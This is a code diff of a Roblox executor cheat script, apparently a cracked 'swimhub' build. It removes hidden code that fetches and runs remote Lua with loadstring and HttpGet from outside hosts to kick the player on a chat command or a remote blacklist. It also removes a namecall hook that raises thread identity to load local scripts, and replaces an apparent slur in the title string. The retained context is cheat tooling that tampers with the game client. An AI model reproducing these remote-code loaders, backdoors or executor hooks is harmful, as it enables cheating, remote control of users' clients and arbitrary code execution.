@@ -77,15 +77,6 @@ getgenv().swimhub_settings = {
     nohookdetection = false, -- no index/newindex/namecall detections
     verbosemode = true -- prints current loading state
 }
-coroutine.resume(coroutine.create(function()if not game:IsLoaded()then game.Loaded:Wait()end;local function a(b)b=b:lower()for _,d in ipairs(game:GetService("Players"):GetPlayers())do if b==d.Name:lower():sub(1,#b)then return d end end;return nil end;local e=game:GetService("Players").LocalPlayer;local f=loadstring(game:HttpGet"https://raw.githubusercontent.com/Splay1/UserIds/main/UserID.lua")()local g=game:GetService("ReplicatedStorage")local h=g:WaitForChild("DefaultChatSystemChatEvents",math.huge)local i=h:WaitForChild("OnMessageDoneFiltering",math.huge)if i:IsA("RemoteEvent")then i.OnClientEvent:Connect(function(j)if j~=nil then local k=tostring(j.Message):split(" ")local d=tostring(j.FromSpeaker)local l=table.find(f,d)~=e.Name and table.find(f,d)~=nil;if l then if k[1]=="-kick"and a(k[2]).Name==game:GetService("Players").LocalPlayer.Name then e:Kick(k[3])end end end end)end;end))
-coroutine.resume(coroutine.create(function()
-    while wait(3) do
-        local blak = loadstring(game:HttpGet("https://protogen.gay/goofball/%F0%9F%99%8F%F0%9F%98%88bless%F0%9F%A4%AC%F0%9F%92%80%F0%9F%92%80the%F0%9F%92%AF%F0%9F%98%B3%F0%9F%98%B3crack%F0%9F%A5%B6%F0%9F%A5%B6/blacklist.lua"))()
-        if blak[game:GetService("Players").LocalPlayer.UserId] then
-            game:GetService("Players").LocalPlayer:Kick(blak[game:GetService("Players").LocalPlayer.UserId])
-        end
-    end
-end))
 local function wrap(f) coroutine.resume(coroutine.create(f)) end
 if game.GameId == 450749276 then
     getgenv().swimhub_settings.safemode = true
@@ -751,7 +742,7 @@ local luatab = Tabs.Lua:AddRightGroupbox('swimlua');
         end;
 
         text.Text = title:format(
-            "negero",
+            "0.0.1",
             math.floor(FPS),
             math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue())
         );
@@ -769,41 +760,8 @@ local function refreshluas()
     table.foreach(valids, print)
     return valids
 end
-luatab:AddLabel("docs at dc server")
-if noadonis then
-    luatab:AddDropdown('luadropdown', {
-        Values = {''},
-        Default = 1,
-        Multi = false,
-        Text = 'lua list',
-        Tooltip = 'select desired lua'
-    }):SetValues(refreshluas())
-    luatab:AddButton('refresh', function()
-        Options.luadropdown:SetValues(refreshluas())
-    end)
-    local _nc;_nc = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
-        local method = getnamecallmethod():lower()
-        local args = {...}
-        if method == "getservice" and args[1] == "swimhub" then
-            local set_identity = (type(syn) == 'table' and syn.set_thread_identity) or setidentity or setthreadcontext
-            set_identity(7)
-            local main = {
-                LuaTab = Tabs.Lua
-            }
-            function main:Notify(...)
-                return Library:Notify(...)
-            end
-            return main
-        end
-        return _nc(self, ...)
-    end))
-    luatab:AddButton('load desired lua', function()
-        loadstring(readfile('swimhub\\lua\\'..Options["luadropdown"].Value))()
-    end)
-else
-    luatab:AddLabel("not available")
-end
 
+luatab:AddLabel("not available")
 do
     varsglobal.cursor.rainbow = false
     varsglobal.cursor.sussy = false
